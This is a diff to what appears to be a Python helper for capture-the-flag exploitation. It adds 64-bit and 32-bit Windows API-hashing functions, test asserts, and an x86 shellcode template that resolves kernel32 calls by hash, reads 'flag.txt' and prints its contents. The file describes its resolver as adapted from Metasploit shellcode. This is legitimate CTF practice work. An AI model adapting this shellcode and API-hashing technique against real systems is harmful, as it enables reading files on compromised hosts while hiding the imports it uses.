@@ -45,7 +45,15 @@ def hash_func(func, w=64):
     return hash(func, w)
 
 def hash_both(mod, func, w=64):
-    return (hash_mod(mod) + hash_func(func)) & ((1<<w)-1)
+    return (hash_mod(mod, w) + hash_func(func, w)) & ((1<<w)-1)
+
+def hash64(func):
+    mod, func = func.split('!')
+    return hash_both(mod, func, 64)
+
+def hash32(func):
+    mod, func = func.split('!')
+    return hash_both(mod, func, 32)
 
 assert hash_mod('wctfdb.exe') == 0xc0af8b40ac01f634
 assert hash_mod('ntdll.dll') == 0x80980b20be020c2e
@@ -53,8 +61,11 @@ assert hash_mod('USER32.DLL') == 0x408e8aa8b1821630
 assert hash_func('wvsprintfW') == 0x448027815b0a9052
 assert hash_func('MessageBoxA') == 0xc43e2a215107b84b
 assert hash_both('ntdll', 'wcstoul') == 0x058437419c094c67
+assert hash64('ntdll!wcstoul') == 0x058437419c094c67
 assert hash_both('user32', 'wvsprintfW') == 0x850eb22a0c8ca682
 assert hash_both('user32', 'MessageBoxA') == 0x04ccb4ca0289ce7b
+assert hash_both('kernel32', 'lstrcmpiW', 32) == 0x6a396fcc
+assert hash32('kernel32!lstrcmpiW') == 0x6a396fcc
 
 # adapted from https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm.
 # Uses 64-bit instead of 32-bit hashes to avoid collisions.
@@ -251,4 +262,43 @@ get_next_mod1:           ;
   pop edx                ; Restore our position in the module list
   mov edx, [edx]         ; Get the next module
   jmp short next_mod     ; Process this module
+'''
+
+'''
+; read file, x86
+
+xor eax, eax
+push eax
+push '.txt'
+push 'flag'
+mov ebx, esp
+sub esp, 0x100
+
+push 0
+push esp
+push ebx
+push {OpenFile}  ; kernel32!OpenFile
+call api_call
+
+mov ebp, esp
+
+push 0
+push 0
+push 0x100
+push ebp
+push eax
+push {ReadFile}  ; kernel32!ReadFile
+call api_call
+
+push -11 ; STD_OUTPUT_HANDLE
+push {GetStdHandle} ; kernel32!GetStdHandle
+call api_call
+
+push 0
+push 0
+push 0x100
+push ebp
+push eax
+push {WriteFile}  ; kernel32!WriteFile
+call api_call
 '''
